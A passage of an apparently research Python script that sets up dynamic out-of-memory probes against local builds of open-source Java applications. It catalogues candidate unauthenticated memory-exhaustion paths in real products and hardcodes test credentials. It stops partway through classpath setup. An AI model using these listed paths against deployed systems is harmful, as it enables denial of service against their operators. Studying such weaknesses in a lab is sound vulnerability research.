#!/usr/bin/env python3
"""Run application-level P1 dynamic OOM probes."""

from __future__ import annotations

import argparse
import csv
import dataclasses
import hashlib
import http.client
import json
import re
import shutil
import socket
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.parse
from collections.abc import Callable
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import run_application_p0_dynamic_validation as p0


BASE_DIR = p0.BASE_DIR
OUT_DIR = BASE_DIR / "results" / "applications_dynamic_validation" / "p1"
LOG_DIR = OUT_DIR / "logs"
RUNTIME_DIR = OUT_DIR / "runtime"
SOURCE_PLAN = BASE_DIR / "results" / "applications_static_analysis" / "_static_validation" / "all_candidates_dynamic_validation.md"

NACOS_DIR = BASE_DIR / "frameworks" / "applications" / "alibaba__nacos"
CAT_DIR = BASE_DIR / "frameworks" / "applications" / "dianping__cat"
JMQTT_DIR = BASE_DIR / "frameworks" / "applications" / "cicizz__jmqtt"
SBA_DIR = BASE_DIR / "frameworks" / "applications" / "codecentric__spring-boot-admin"
SOCKET_MQTT_DIR = BASE_DIR / "frameworks" / "applications" / "daoshenzzg__socket-mqtt"
DIYHI_DIR = BASE_DIR / "frameworks" / "applications" / "diyhi__bbs"
JPOM_DIR = BASE_DIR / "frameworks" / "applications" / "dromara__jpom"
UJCMS_DIR = BASE_DIR / "frameworks" / "applications" / "dromara__ujcms"
ERUPT_DIR = BASE_DIR / "frameworks" / "applications" / "erupts__erupt"
REBUILD_DIR = BASE_DIR / "frameworks" / "applications" / "getrebuild__rebuild"
OPSLI_DIR = BASE_DIR / "frameworks" / "applications" / "hiparker__opsli-boot"
LITEMALL_DIR = BASE_DIR / "frameworks" / "applications" / "linlinjava__litemall"
SHOPCART_DIR = BASE_DIR / "frameworks" / "applications" / "shashirajraja__shopping-cart"
XXL_BOOT_DIR = BASE_DIR / "frameworks" / "applications" / "xuxueli__xxl-boot"
NACOS_TEST_TOKEN_SECRET = "VGhpc0lzTXlDdXN0b21TZWNyZXRLZXkwMTIzNDU2Nzg="

# Keep imported helper output paths in the P1 tree.
p0.OUT_DIR = OUT_DIR
p0.LOG_DIR = LOG_DIR
p0.RUNTIME_DIR = RUNTIME_DIR


FIRST_PRIORITY_CASE_IDS: tuple[str, ...] = (
    "NACOS-APP-STATIC-0001",
    "NACOS-APP-STATIC-0002",
    "JMQTT-APP-STATIC-0001",
    "JMQTT-APP-STATIC-0002",
    "JMQTT-APP-STATIC-0003",
    "SBA-APP-STATIC-0001",
    "SBA-APP-STATIC-0003",
    "SBA-APP-STATIC-0004",
    "CRYO-STATIC-0001",
    "CRYO-STATIC-0002",
    "CRYO-STATIC-0003",
    "SOCKETMQTT-APP-STATIC-0001",
    "CAT-APP-STATIC-0001",
    "CAT-APP-STATIC-0003",
    "DIYHI-BBS-APP-STATIC-0002",
    "DIYHI-BBS-APP-STATIC-0003",
    "DIYHI-BBS-APP-STATIC-0004",
    "JPOM-STATIC-0001",
    "JPOM-STATIC-0002",
    "UJCMS-APP-STATIC-0001",
    "ERUPT-APP-STATIC-0001",
    "ERUPT-APP-STATIC-0002",
    "REBUILD-APP-STATIC-0001",
    "REBUILD-APP-STATIC-0002",
    "REBUILD-APP-STATIC-0003",
    "REBUILD-APP-STATIC-0004",
    "OPSLI-BOOT-APP-STATIC-0001",
    "LITEMALL-APP-STATIC-0001",
    "ITRANSWARP-APP-STATIC-0001",
    "ITRANSWARP-APP-STATIC-0002",
    "ITRANSWARP-APP-STATIC-0003",
    "SPMS-APP-STATIC-0001",
    "SHOPCART-APP-STATIC-0001",
    "WGCLOUD-APP-STATIC-0002",
    "RILL-FLOW-APP-STATIC-0002",
    "RILL-FLOW-APP-STATIC-0003",
    "XXL-BOOT-APP-STATIC-0001",
    "XXL-BOOT-APP-STATIC-0003",
)


@dataclasses.dataclass(frozen=True)
class Candidate:
    candidate_id: str
    app: str
    title: str
    runner: str | None
    blocked_reason: str = ""


ProbeResult = p0.ProbeResult


P1_CANDIDATES: tuple[Candidate, ...] = (
    Candidate("SMARTADMIN-STATIC-0002", "1024-lab__smart-admin", "Local file download copies whole file into heap before response", None, "默认上传链路只允许约 10-30MiB 文件，静态证据未给出默认可获得超大本地 fileKey 的路径；不作为本轮 OOM 自动探针。"),
    Candidate("DB2REST-APP-STATIC-0001", "9tigerio__db2rest", "Default-open read API accepts arbitrary positive limit and materializes JDBC results", None, "需要构造默认 DB2Rest 数据源与大表数据；P1 静态建议也要求本地大表。当前未将持久化种库作为直接 OOM 成功条件。"),
    Candidate("DB2REST-APP-STATIC-0002", "9tigerio__db2rest", "Default-open bulk JSON/CSV endpoint materializes entire body and JDBC batch", None, "需要默认 DB2Rest 可写数据源与表结构；bulk 写入同时产生 DB 副作用，本轮未自动种库。"),
    Candidate("DB2REST-APP-STATIC-0003", "9tigerio__db2rest", "Default-open _expand join body has no join count or SQL length cap", None, "需要多表 schema 与可 join 数据；默认可达性和 DB 代价边界需单独设计。"),
    Candidate("DB2REST-APP-STATIC-0004", "9tigerio__db2rest", "Default-open admin reloadCache repeats JDBC metadata reload", None, "主要依赖 schema 大小和 DB metadata latency；静态未证明请求可直接触发 JVM OOM。"),
    Candidate("NACOS-APP-STATIC-0001", "alibaba__nacos", "Default-open instance registration grows naming client/service state", "nacos_instance_registration"),
    Candidate("NACOS-APP-STATIC-0002", "alibaba__nacos", "Default-open SDK gRPC ConfigBatchListenRequest grows listener indexes", "nacos_config_batch_listen"),
    Candidate("JMQTT-APP-STATIC-0001", "cicizz__jmqtt", "默认匿名 SUBSCRIBE 可增长进程级 CTrie 订阅树", "jmqtt_subscribe_tree"),
    Candidate("JMQTT-APP-STATIC-0002", "cicizz__jmqtt", "匿名 QoS2 PUBLISH 半握手保留 DeviceMessage", "jmqtt_qos2_half_handshake"),
    Candidate("JMQTT-APP-STATIC-0003", "cicizz__jmqtt", "匿名订阅端拒绝 ACK 累积 outboundFlowMessages", "jmqtt_outbound_no_ack"),
    Candidate("JMQTT-APP-STATIC-0004", "cicizz__jmqtt", "默认 protocol processor 大有界队列压力", None, "有界队列压力不是无界 retained-state，且 JMQTT 默认 broker 环境未脚本化。"),
    Candidate("JMQTT-APP-STATIC-0005", "cicizz__jmqtt", "ConnectManager 在线 clientId 无应用级数量上限", None, "主要受连接、fd、idle 和 OS 限制；本轮不将通用连接容量作为 OOM 自动探针。"),
    Candidate("SBA-APP-STATIC-0001", "codecentric__spring-boot-admin", "Default Admin Server REST API POST /instances grows registry", "sba_instances_registry"),
    Candidate("SBA-APP-STATIC-0003", "codecentric__spring-boot-admin", "Repeated /instances entries amplify event-stream grouping", "sba_application_fanout"),
    Candidate("SBA-APP-STATIC-0004", "codecentric__spring-boot-admin", "Default-open SSE endpoints materialize application/event streams", "sba_sse_slow_clients"),
    Candidate("CRYO-STATIC-0001", "cryostatio__cryostat-legacy", "默认 Noop run WebSocket accepted connections 无实际小上限", None, "需要 Cryostat Noop run 服务和 WebSocket harness；本轮未集成。"),
    Candidate("CRYO-STATIC-0002", "cryostatio__cryostat-legacy", "POST /api/v2/targets 唯一 connectUrl 遗留 targetLocks key", None, "需要 Cryostat Noop run 和目标管理 API harness；本轮未集成。"),
    Candidate("CRYO-STATIC-0003", "cryostatio__cryostat-legacy", "多个 BodyHandler.create(true) 入口缺少 body limit", None, "需要 Cryostat 默认服务启动；本轮未集成。"),
    Candidate("SOCKETMQTT-APP-STATIC-0001", "daoshenzzg__socket-mqtt", "默认 MQTT broker ByteBufHolder retain 后无 release", "socket_mqtt_publish_retention"),
    Candidate("SOCKETMQTT-APP-STATIC-0002", "daoshenzzg__socket-mqtt", "默认业务线程池使用 1,000,000 大队列", None, "Socket-MQTT broker 默认启动尚未脚本化；该候选也偏有界队列压力。"),
    Candidate("SOCKETMQTT-APP-STATIC-0004", "daoshenzzg__socket-mqtt", "默认 Server.channels 无应用级连接数上限", None, "主要是通用连接容量边界；本轮不作为 OOM 自动探针。"),
    Candidate("CAT-APP-STATIC-0001", "dianping__cat", "Anonymous project registry growth via /s/project projectUpdate", "cat_project_registry"),
    Candidate("CAT-APP-STATIC-0002", "dianping__cat", "Anonymous alert and alteration table growth with unbounded view materialization", None, "依赖 DB 行增长后的视图放大；本轮不把持久化种库作为直接 OOM 成功条件。"),
    Candidate("CAT-APP-STATIC-0003", "dianping__cat", "Anonymous resource-config replacement can inflate retained permission map", None, "需要 CAT 默认 Web 环境；本轮未集成。"),
    Candidate("DIYHI-BBS-APP-STATIC-0001", "diyhi__bbs", "Anonymous /search page parameter amplifies Lucene TopDocs", None, "需要默认索引和数据规模；未种索引数据。"),
    Candidate("DIYHI-BBS-APP-STATIC-0002", "diyhi__bbs", "Anonymous /captcha/{captchaKey} writes attacker-controlled keys into high-capacity Ehcache", "diyhi_captcha_cache"),
    Candidate("DIYHI-BBS-APP-STATIC-0003", "diyhi__bbs", "Anonymous failed login attempts create high-cardinality cache keys", "diyhi_login_submit_quantity"),
    Candidate("DIYHI-BBS-APP-STATIC-0004", "diyhi__bbs", "Anonymous /statistic/add can fill process-wide PV queue", "diyhi_statistic_queue"),
    Candidate("DCMP-STATIC-0003", "dromara__datacompare", "DbConfig testConnection lets low-privileged users open attacker JDBC connections", None, "主要依赖外部数据库连接延迟/网络；P0 已验证同应用 static map OOM，本候选不作为内存 OOM 自动探针。"),
    Candidate("JPOM-STATIC-0001", "dromara__jpom", "Anonymous captcha endpoint can grow one-hour server servlet sessions", "jpom_rand_code_sessions"),
    Candidate("JPOM-STATIC-0002", "dromara__jpom", "Default receive-push token permits process-lifetime static cache growth", None, "需要 official local/cluster compose 和默认 token 路径；本轮未集成。"),
    Candidate("UJCMS-APP-STATIC-0001", "dromara__ujcms", "Public visit endpoint retains inflated referrer strings in visitLogCache", "ujcms_visit_referrer"),
    Candidate("UJCMS-APP-STATIC-0002", "dromara__ujcms", "Public visit endpoint constructs full uap-java Parser per request", None, "请求局部 CPU/heap 压力，需 UJCMS 默认服务；本轮未集成。"),
    Candidate("ELADMIN-APP-STATIC-0004", "elunez__eladmin", "S3 upload endpoint lacks method-level authorization and app file-size quota", None, "依赖 S3/MinIO 配置，且偏上传/存储；本轮不作为 OOM 自动探针。"),
    Candidate("ERUPT-APP-STATIC-0001", "erupts__erupt", "Anonymous captcha height drives BufferedImage allocation", "erupt_captcha_height"),
    Candidate("ERUPT-APP-STATIC-0002", "erupts__erupt", "Operation-log filter copies /erupt-api JSON body before auth", "erupt_json_body_filter"),
    Candidate("ERUPT-APP-STATIC-0003", "erupts__erupt", "Sample-default /mcp/sse creates per-connection executor/scheduler threads", None, "依赖 sample-default MCP SSE 是否启用；本轮未确认默认启动面。"),
    Candidate("REBUILD-APP-STATIC-0001", "getrebuild__rebuild", "Anonymous intercepted requests create Tomcat HttpSession before auth", "rebuild_session_growth"),
    Candidate("REBUILD-APP-STATIC-0002", "getrebuild__rebuild", "Anonymous barcode rendering can allocate oversized BitMatrix/BufferedImage", "rebuild_barcode_render"),
    Candidate("REBUILD-APP-STATIC-0003", "getrebuild__rebuild", "Unauthenticated API gateway parses raw JSON before signature verification", "rebuild_api_gateway_body"),
    Candidate("REBUILD-APP-STATIC-0004", "getrebuild__rebuild", "Anonymous captcha endpoint creates sessions and finite MobKey cache entries", "rebuild_captcha_sessions"),
    Candidate("REBUILD-APP-STATIC-0005", "getrebuild__rebuild", "Anonymous login failures fill finite retry keys", None, "有限 cache，需 Rebuild 默认服务；本轮未集成。"),
    Candidate("REBUILD-APP-STATIC-0006", "getrebuild__rebuild", "X-ReqRandom pre-auth re-entry cache finite key growth", None, "有限 cache，需 Rebuild 默认服务；本轮未集成。"),
    Candidate("HALO-APP-STATIC-0001", "halo-dev__halo", "Low-privileged attachment upload and URL transfer grow local storage", None, "静态复核资源为 request_burst_heap 但标题/路径主要是本地存储增长；按用户口径不把磁盘增长作为 OOM 真阳。"),
    Candidate("OPSLI-BOOT-APP-STATIC-0001", "hiparker__opsli-boot", "Default WAF copies anonymous JSON request bodies", "opsli_waf_json_body"),
    Candidate("OPSLI-BOOT-APP-STATIC-0004", "hiparker__opsli-boot", "@Limiter spoofable proxy headers fill bounded cache", None, "有限 100000-entry cache，且需 OPSLI 服务启动；本轮未集成。"),
    Candidate("INSPECTIT-OCELOT-APP-STATIC-0001", "inspectit__inspectit-ocelot", "Anonymous agent configuration fetch fills bounded caches", None, "bounded cache，需 inspectIT server harness；本轮未集成。"),
    Candidate("INSPECTIT-OCELOT-APP-STATIC-0002", "inspectit__inspectit-ocelot", "Anonymous agent command polling holds requests for 30s", None, "长轮询 worker 占用，非 OOM 首要；本轮未集成。"),
    Candidate("JAVAMELODY-APP-STATIC-0001", "javamelody__javamelody", "MonitoringFilter retains bursty request-name cardinality before cleanup", None, "需要带 JavaMelody 的默认被监控应用；普通库本身不是完整默认 Web app。"),
    Candidate("JAVAMELODY-APP-STATIC-0002", "javamelody__javamelody", "Default-open /monitoring reports expose expensive diagnostics", None, "需要代表性被监控 JVM/MBean/线程规模；本轮未集成。"),
    Candidate("JAVAMELODY-APP-STATIC-0003", "javamelody__javamelody", "Collector-server POST registration grows registries", None, "需要 collector-server webapp 默认部署；本轮未集成。"),
    Candidate("LITEMALL-APP-STATIC-0001", "linlinjava__litemall", "Anonymous admin captcha creates long-lived in-memory Shiro sessions", "litemall_admin_captcha_sessions"),
    Candidate("LITEMALL-APP-STATIC-0002", "linlinjava__litemall", "Anonymous wx storefront list/search endpoints lack page-size caps", None, "依赖数据集规模；未种商品/评论数据。"),
    Candidate("LITEMALL-APP-STATIC-0003", "linlinjava__litemall", "Low-privilege order submission enqueues unpaid-order DelayQueue tasks", None, "需要完整业务状态、库存、地址、订单写入；本轮不作为自动 OOM 探针。"),
    Candidate("MYPERF4J-APP-STATIC-0001", "linshunkang__myperf4j", "Default built-in HTTP server reads anonymous POST bodies fully into heap", None, "MyPerf4J 是 agent/嵌入式监控组件，需要受控被注入应用；本轮未集成样例宿主。"),
    Candidate("MYPERF4J-APP-STATIC-0002", "linshunkang__myperf4j", "Default HTTP worker pool can be occupied by slow/large POST body reads", None, "同上，需要 agent 宿主；并且主要是 worker 占用而非 OOM。"),
    Candidate("THRIVEX-APP-STATIC-0001", "liuyuyang01__thrivex-server", "匿名友链 mass assignment 后 /api/rss fan-out RSS 解析", None, "需要默认服务、DB 和外部可控 RSS 源；本轮未搭建外部 RSS 服务与数据注入。"),
    Candidate("THRIVEX-APP-STATIC-0002", "liuyuyang01__thrivex-server", "匿名评论/留言 mass assignment 后公开列表全量加载", None, "需要大量 DB 行作为二阶段放大；本轮不把持久化种库作为直接 OOM 成功条件。"),
    Candidate("THRIVEX-APP-STATIC-0003", "liuyuyang01__thrivex-server", "匿名新增会调度异步邮件发送", None, "依赖 SMTP 配置/延迟；本轮未配置外部邮件服务。"),
    Candidate("MALL-APP-STATIC-0002", "macrozheng__mall", "Anonymous public list/search endpoints with pageSize", None, "依赖真实商品/品牌数据量；本轮未启动 mall 全栈 DB/Redis 并种数据。"),
    Candidate("MALL-APP-STATIC-0003", "macrozheng__mall", "Anonymous mall-search Elasticsearch pageSize", None, "依赖默认 Elasticsearch 和索引数据；本轮未启动 mall-search/ES 栈。"),
    Candidate("EA-STATIC-0003", "megaease__easeagent", "Spring Gateway metric fallback uses full URI as metric key", None, "EaseAgent 是 Java agent 插桩，需要受控 Gateway 宿主和 agent 注入；本轮未集成。"),
    Candidate("ITRANSWARP-APP-STATIC-0001", "michaelliao__itranswarp", "Spoofable proxy IP headers create Redis rate-limit key cardinality", None, "短 TTL Redis key 增长需默认 compose/Redis maxmemory 实测；本轮未集成。"),
    Candidate("ITRANSWARP-APP-STATIC-0002", "michaelliao__itranswarp", "Large JSON @RequestBody parsed before role checks", None, "需要 itranswarp 默认服务启动；本轮未集成。"),
    Candidate("ITRANSWARP-APP-STATIC-0003", "michaelliao__itranswarp", "Passkey signin parses attacker-sized WebAuthn fields", None, "需要 itranswarp 默认服务和 syntactically-shaped WebAuthn payload；本轮未集成。"),
    Candidate("POWERJOB-APP-STATIC-0003", "powerjob__powerjob", "Default-exposed HTTP remote workerHeartbeat can grow static worker cluster maps", "powerjob_worker_heartbeat"),
    Candidate("JMXEXPORTER-APP-STATIC-0001", "prometheus__jmx_exporter", "Anonymous /metrics requests trigger full JMX scrape", None, "jmx_exporter 需要被监控 JVM 或 standalone JMX 目标；静态未证明 HTTP 键控 retained growth。"),
    Candidate("SMQTT-APP-STATIC-0001", "quickmsg__smqtt", "Anonymous persistent MQTT sessions retain client registry entries after disconnect", "smqtt_persistent_sessions"),
    Candidate("SMQTT-APP-STATIC-0003", "quickmsg__smqtt", "Publishing to never-subscribed topics creates empty global topic keys", "smqtt_empty_topic_keys"),
    Candidate("SMQTT-APP-STATIC-0006", "quickmsg__smqtt", "QoS2 half-handshake retains publish messages and retry ack state", "smqtt_qos2_half_handshake"),
    Candidate("SPMS-APP-STATIC-0001", "s-pms__spms-server", "Anonymous verification-code endpoints create short-TTL Redis keys", None, "需要 SPMS 默认服务和 Redis；短 TTL external cache 增长需单独 Redis maxmemory 实测。"),
    Candidate("SHOPCART-APP-STATIC-0001", "shashirajraja__shopping-cart", "匿名 JSP 默认创建 server-side session", "shopping_cart_jsp_sessions"),
    Candidate("SHOPCART-APP-STATIC-0002", "shashirajraja__shopping-cart", "默认低权限路径在 static MySQL Connection 上累积未关闭语句", None, "需要 MySQL 和业务路径；主要是连接/语句资源泄漏，非 OOM 首要。"),
    Candidate("SHOPCART-APP-STATIC-0003", "shashirajraja__shopping-cart", "公开邮件路径同步 SMTP 且未配置 socket 超时", None, "依赖 SMTP 连接行为；本轮未搭建慢 SMTP。"),
    Candidate("KWV-APP-STATIC-0001", "sourcelaborg__kafka-webview", "Authenticated consume API enqueues Kafka tasks", None, "需要 Kafka 集群、登录态和分区数据；本轮未集成。"),
    Candidate("LINCMS-APP-STATIC-0001", "talelin__lin-cms-spring-boot", "Anonymous unpaged book list/search materializes result sets", None, "需要默认 DB 与大量 book 数据；本轮未种数据。"),
    Candidate("LINCMS-APP-STATIC-0002", "talelin__lin-cms-spring-boot", "Anonymous login drives PBKDF2 verification", None, "CPU 型候选，非 OOM 首要；需要默认服务。"),
    Candidate("WGCLOUD-APP-STATIC-0002", "tianshiyeben__wgcloud", "Default-token /agent/minTask raw JSON and static BatchData", "wgcloud_min_task"),
    Candidate("WGCLOUD-APP-STATIC-0003", "tianshiyeben__wgcloud", "Public dashboard materializes attacker-sized pages when dashView enabled", None, "依赖 dashView 配置和 DB 数据；默认可达性需复核。"),
    Candidate("RILL-FLOW-APP-STATIC-0002", "weibocom__rill-flow", "默认无有效鉴权 /flow/trigger.json 解析 context", None, "需要 Rill Flow 默认 Redis/MySQL/任务存在性环境；本轮未集成。"),
    Candidate("RILL-FLOW-APP-STATIC-0003", "weibocom__rill-flow", "默认无有效鉴权 convert/dependency_check 解析 DAG YAML/JSON", None, "需要 Rill Flow 默认服务；本轮未集成。"),
    Candidate("WANGMARKET-APP-STATIC-0002", "xnx3__wangmarket", "公开站点页面写 SImpleSiteVO 到匿名 session", None, "P0 已测同类 WangMarket captcha session 20k 请求未 OOM；该变体暂不重复跑。"),
    Candidate("XXL-BOOT-APP-STATIC-0001", "xuxueli__xxl-boot", "Anonymous /login/register JSON body RepeatableFilter copies heap", "xxl_boot_repeatable_body"),
    Candidate("XXL-BOOT-APP-STATIC-0003", "xuxueli__xxl-boot", "Anonymous login failures enqueue async login-log TimerTasks", "xxl_boot_login_failures"),
    Candidate("XXL-JOB-APP-STATIC-0003", "xuxueli__xxl-job", "Default-token GLUE_GROOVY trigger compiles unique glueSource", "xxl_glue_groovy"),
    Candidate("XXL-JOB-APP-STATIC-0004", "xuxueli__xxl-job", "Netty HttpObjectAggregator accepts near-5MiB bodies on executor endpoints", "xxl_large_body_aggregator"),
    Candidate("RYVF-APP-STATIC-0002", "yangzongzhuan__ruoyi-vue-fast", "Anonymous JSON requests copied into heap by RepeatableFilter before /login", "ryvf_login_repeatable_body"),
    Candidate("RYVF-APP-STATIC-0004", "yangzongzhuan__ruoyi-vue-fast", "Anonymous login failures enqueue login-log TimerTasks", None, "P1 静态候选偏异步日志队列/DB 写入，P0 已在同一默认环境验证大请求体 OOM；本轮暂不重复跑登录失败队列。"),
    Candidate("CITRUS-APP-STATIC-0002", "yiuman__citrus", "Anonymous /rest/authenticate JSON body is fully buffered and parsed before auth", "citrus_authenticate_body"),
)


def rel(path: Path) -> str:
    return p0.rel(path)


def finish_probe(
    case: Candidate,
    process,
    handle,
    log_path: Path,
    requests_sent: int,
    evidence: dict[str, object],
    notes: str = "",
) -> ProbeResult:
    p0_case = p0.Candidate(case.candidate_id, case.app, case.title, case.runner, case.blocked_reason)
    return p0.finish_probe(p0_case, process, handle, log_path, requests_sent, evidence, notes)


def wait_for_host_port(host: str, port: int, timeout: float) -> bool:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            with socket.create_connection((host, port), timeout=0.5):
                return True
        except OSError:
            time.sleep(0.25)
    return False


def start_jmqtt_mysql_container(name: str, port: int) -> str:
    if not p0.docker_available():
        raise RuntimeError("docker is not available for JMQTT MySQL dependency")
    p0.docker_rm(name)
    image = p0.docker_pull_first([f"docker.1ms.run/mysql:5.7", "mysql:5.7"])
    completed = p0.docker_run(
        [
            "docker",
            "run",
            "-d",
            "--name",
            name,
            "-e",
            "MYSQL_ROOT_PASSWORD=CallmeZ2013",
            "-e",
            "MYSQL_ROOT_HOST=%",
            "-p",
            f"127.0.0.1:{port}:3306",
            image,
            "--character-set-server=utf8mb4",
            "--collation-server=utf8mb4_unicode_ci",
            "--lower_case_table_names=1",
            "--explicit_defaults_for_timestamp=OFF",
        ]
    )
    if completed.returncode != 0:
        raise RuntimeError(f"failed to start JMQTT MySQL container {name}:\n{completed.stdout}")
    if not p0.wait_for_port(port, 120):
        raise RuntimeError(f"JMQTT MySQL container {name} did not expose port {port}")
    deadline = time.monotonic() + 120
    while time.monotonic() < deadline:
        ping = p0.docker_run(["docker", "exec", name, "mysqladmin", "ping", "-uroot", "-pCallmeZ2013", "--silent"])
        if ping.returncode == 0:
            p0.wait_for_mysql_sql(name, "CallmeZ2013")
            return image
        time.sleep(2)
    raise RuntimeError(f"JMQTT MySQL container {name} did not become ready")


def powerjob_remote_hosts(log_path: Path, remote_port: int) -> list[str]:
    text = p0.log_text(log_path)
    hosts: list[str] = []
    for pattern in (
        rf"RemoteEngine\[address=([0-9A-Za-z_.-]+):{remote_port}\]",
        rf"bindAddress=([0-9A-Za-z_.-]+):{remote_port}",
        rf"address=([0-9A-Za-z_.-]+):{remote_port}",
    ):
        for match in re.finditer(pattern, text):
            host = match.group(1)
            if host not in hosts:
                hosts.append(host)
    return hosts


def wait_for_powerjob_remote_host(log_path: Path, remote_port: int, process) -> str:
    deadline = time.monotonic() + 90
    tried: list[str] = []
    while time.monotonic() < deadline:
        if process.poll() is not None:
            break
        for host in [*powerjob_remote_hosts(log_path, remote_port), "127.0.0.1"]:
            if host not in tried:
                tried.append(host)
            if wait_for_host_port(host, remote_port, 0.5):
                return host
        time.sleep(0.5)
    raise RuntimeError(
        f"PowerJob remote HTTP did not accept TCP on discovered hosts {tried or ['127.0.0.1']}; "
        f"see {rel(log_path)}"
    )


def manual_probe_result(
    case: Candidate,
    process,
    handle,
    log_path: Path,
    requests_sent: int,
    evidence: dict[str, object],
    status: str,
    dynamic_verdict: str,
    true_positive: bool,
    notes: str,
) -> ProbeResult:
    p0_case = p0.Candidate(case.candidate_id, case.app, case.title, case.runner, case.blocked_reason)
    return p0.manual_probe_result(
        p0_case,
        process,
        handle,
        log_path,
        requests_sent,
        evidence,
        status,
        dynamic_verdict,
        true_positive,
        notes,
    )


def p0_case(case: Candidate) -> p0.Candidate:
    return p0.Candidate(case.candidate_id, case.app, case.title, case.runner, case.blocked_reason)


def unique_existing_classpath(items: list[str]) -> list[str]:
    seen: set[str] = set()
    existing: list[str] = []
    for item in items:
        if not item or item in seen:
            continue
        if Path(item).exists():
            existing.append(item)
            seen.add(item)
    return existing


def classpath_from_javac_args(args_files: list[Path]) -> list[str]:
    classpath: list[str] = []
    for args_file in args_files:
        if not args_file.exists():
            continue
        lines = args_file.read_text(encoding="utf-8", errors="replace").splitlines()
        for index, line in enumerate(lines[:-1]):
            if line in {"-classpath", "--class-path", "-cp"}:
                classpath.extend(item for item in lines[index + 1].split(":") if item)
    return unique_existing_classpath(classpath)


def application_javac_args(app_db: str) -> list[Path]:
    ext_dir = BASE_DIR / "databases" / "applications" / app_db / "log" / "ext"
    return sorted(ext_dir.glob("javac*.args"))


def classpath_from_application_db(app_db: str, local_classes: list[Path], extra_items: list[Path] | None = None) -> str:
    existing_classes = [path.as_posix() for path in local_classes if path.exists()]
    extra = [path.as_posix() for path in extra_items or [] if path.exists()]
    return ":".join(unique_existing_classpath([*existing_classes, *extra, *classpath_from_javac_args(application_javac_args(app_db))]))


def ensure_p1_classpath(
    name: str,
    classpath_file: Path,
    mvn_cwd: Path,
    mvn_args: list[str],
    local_classes: list[Path],
    dependency_filter: Callable[[str], bool] | None = None,
    fallback_args_files: list[Path] | None = None,
) -> str:
    completed = None
    if not classpath_file.exists() or not classpath_file.read_text(encoding="utf-8", errors="replace").strip():
        completed = p0.run(mvn_args, mvn_cwd)
        if completed.returncode != 0 and (
            not classpath_file.exists() or not classpath_file.read_text(encoding="utf-8", errors="replace").strip()
        ):
            fallback_items = classpath_from_javac_args(fallback_args_files or [])
            if fallback_items:
                existing_classes = [path.as_posix() for path in local_classes if path.exists()]
                return ":".join(unique_existing_classpath([*existing_classes, *fallback_items]))
            raise RuntimeError(f"{name} classpath build failed:\n{completed.stdout}")
    dependency_items = [
        item
        for item in classpath_file.read_text(encoding="utf-8", errors="replace").strip().split(":")
        if item
    ]
    if dependency_filter is not None:
        dependency_items = [item for item in dependency_items if dependency_filter(item)]
    existing_classes = [path.as_posix() for path in local_classes if path.exists()]
    fallback_items = classpath_from_javac_args(fallback_args_files or [])
    classpath = unique_existing_classpath([*existing_classes, *dependency_items, *fallback_items])
    if not classpath and fallback_args_files:
        classpath = unique_existing_classpath([*existing_classes, *classpath_from_javac_args(fallback_args_files)])
    if not classpath and completed is not None and completed.returncode != 0:
        raise RuntimeError(f"{name} classpath build failed:\n{completed.stdout}")
    return ":".join(classpath)


def sba_classpath() -> str:
    sample = SBA_DIR / "spring-boot-admin-samples" / "spring-boot-admin-sample-servlet"
    m2 = BASE_DIR / ".build-cache" / "m2" / "repository"
    modules = [
        sample / "target" / "classes",
        SBA_DIR / "spring-boot-admin-samples" / "spring-boot-admin-sample-custom-ui" / "target" / "classes",
        SBA_DIR / "spring-boot-admin-server" / "target" / "classes",
        SBA_DIR / "spring-boot-admin-server-ui" / "target" / "classes",
        SBA_DIR / "spring-boot-admin-server-cloud" / "target" / "classes",
        SBA_DIR / "spring-boot-admin-client" / "target" / "classes",
        SBA_DIR / "spring-boot-admin-starter-server" / "target" / "classes",
        SBA_DIR / "spring-boot-admin-starter-client" / "target" / "classes",
        m2 / "org" / "springframework" / "spring-jdbc" / "7.0.8" / "spring-jdbc-7.0.8.jar",
        m2 / "org" / "springframework" / "spring-tx" / "7.0.8" / "spring-tx-7.0.8.jar",
        m2 / "org" / "springframework" / "spring-context-support" / "7.0.8" / "spring-context-support-7.0.8.jar",
        m2 / "org" / "springframework" / "session" / "spring-session-core" / "4.1.0" / "spring-session-core-4.1.0.jar",
        m2 / "org" / "springframework" / "session" / "spring-session-jdbc" / "4.1.0" / "spring-session-jdbc-4.1.0.jar",
        m2 / "org" / "springframework" / "boot" / "spring-boot-quartz" / "4.1.0" / "spring-boot-quartz-4.1.0.jar",
        m2 / "org" / "quartz-scheduler" / "quartz" / "2.5.2" / "quartz-2.5.2.jar",
        m2 / "com" / "h2database" / "h2" / "2.4.240" / "h2-2.4.240.jar",
        m2 / "org" / "hsqldb" / "hsqldb" / "2.7.3" / "hsqldb-2.7.3.jar",
        m2 / "org" / "jolokia" / "jolokia-support-springboot" / "2.6.0" / "jolokia-support-springboot-2.6.0.jar",
        m2 / "org" / "jolokia" / "jolokia-support-jmx" / "2.6.0" / "jolokia-support-jmx-2.6.0.jar",
        m2 / "org" / "jolokia" / "jolokia-core" / "2.6.0" / "jolokia-core-2.6.0.jar",
        m2 / "org" / "jolokia" / "jolokia-json" / "2.6.0" / "jolokia-json-2.6.0.jar",
        m2 / "org" / "jolokia" / "jolokia-server-core" / "2.6.0" / "jolokia-server-core-2.6.0.jar",
    ]
    return ensure_p1_classpath(
        "spring-boot-admin-sample-servlet",
        Path("/tmp/p1-sba-servlet-cp.txt"),
        SBA_DIR,
        [
            "mvn",
            "-q",
            f"-Dmaven.repo.local={BASE_DIR / '.build-cache' / 'm2' / 'repository'}",
            "-pl",
            "spring-boot-admin-samples/spring-boot-admin-sample-servlet",
            "-am",
            "-DskipTests",
            "dependency:build-classpath",
            "-Dmdep.outputFile=/tmp/p1-sba-servlet-cp.txt",
        ],
        modules,
        dependency_filter=lambda item: "/de/codecentric/" not in item,
    )


def erupt_classpath() -> str:
    modules = [
        ERUPT_DIR / "erupt-sample" / "target" / "classes",
        ERUPT_DIR / "erupt-admin" / "target" / "classes",
        ERUPT_DIR / "erupt-ai" / "target" / "classes",
        ERUPT_DIR / "erupt-annotation" / "target" / "classes",
        ERUPT_DIR / "erupt-core" / "target" / "classes",
        ERUPT_DIR / "erupt-data" / "erupt-jpa" / "target" / "classes",
        ERUPT_DIR / "erupt-security" / "target" / "classes",
        ERUPT_DIR / "erupt-toolkit" / "target" / "classes",
        ERUPT_DIR / "erupt-tpl" / "target" / "classes",
        ERUPT_DIR / "erupt-upms" / "target" / "classes",
        ERUPT_DIR / "erupt-web" / "target" / "classes",
